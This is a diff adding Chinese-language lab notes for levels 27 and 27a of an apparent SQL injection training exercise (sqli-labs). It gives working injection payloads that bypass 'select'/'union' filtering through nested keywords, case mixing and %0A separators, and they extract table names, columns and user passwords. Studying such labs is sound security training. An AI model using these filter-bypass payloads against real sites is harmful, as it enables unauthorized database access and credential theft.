@@ -352,9 +352,85 @@ function blacklist($id)
 
 所幸sql语句正确和错误的时候网页回显是不同的，这关可以用布尔盲注。 
 
-具体代码先不写了，我不会。。。
+具体代码先不写了，我不会。。。容后再写
 
 
 
+# level27
 
+第二十七关和第二十六关差不多，但二十七关没有过滤<code>and</code>和<code>or</code>而是过滤了<code>select</code>和<code>union</code>，可用大小写绕过和重写绕过
+
+![b1854f3aae1a4e58bb19fe9b5ef3966c](./img/b1854f3aae1a4e58bb19fe9b5ef3966c.png)
+
+
+
+![Less-27-01](./img/Less-27-01.PNG)
+
+
+
++ 爆数据表
+
+~~~ shell
+?id=1' or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(table_name))from(information_schema.tables)where(table_schema='security'))),1))or ' 0
+~~~
+
+![Less-27-02](./img/Less-27-02.PNG)
+
+
+
++ 爆字段
+
+~~~ shell
+?id=1'or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(column_name))from(information_schema.columns)where(table_schema='security'and(table_name='users')))),1))or'0
+~~~
+
+![Less-27-03](./img/Less-27-03.PNG)
+
+
+
++ 爆数据
+
+~~~ shell
+?id=1'or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(password,username))from(users))),1))or'0
+~~~
+
+![Less-27-03](./img/Less-27-04.PNG)
+
+
+
+# level27a
+
+该关双引号且页面不显示报错信息，过滤规则和二十七关一样，所以需要盲注和联合注入
+
+![Less-27a](./img/Less-27a.PNG)
+
+
+
++ 爆表
+
+~~~ shell
+? id=0"uniunionon%0AseleSelectct%0A1,2,group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema='security'%0Aand"1
+~~~
+
+![Less-27a-01](./img/Less-27a-01.PNG)
+
+
+
++ 爆列
+
+~~~ shell
+?id=0"uniunionon%0AseleSelectct%0A1,2,group_concat(column_name)from%0Ainformation_schema.columns%0Awhere%0Atable_schema='security'%0Aand%0Atable_name='users'%0Aand"1
+~~~
+
+![Less-27a-02](./img/Less-27a-02.PNG)
+
+
+
++ 爆账号密码
+
+~~~ shell
+?id=0"uniunionon%0AseleSelectct%0A1,2,group_concat(password,id,username)from%0Ausers%0Awhere%0Aid=3%0Aand"1
+~~~
+
+![Less-27a-03](./img/Less-27a-03.PNG)
 
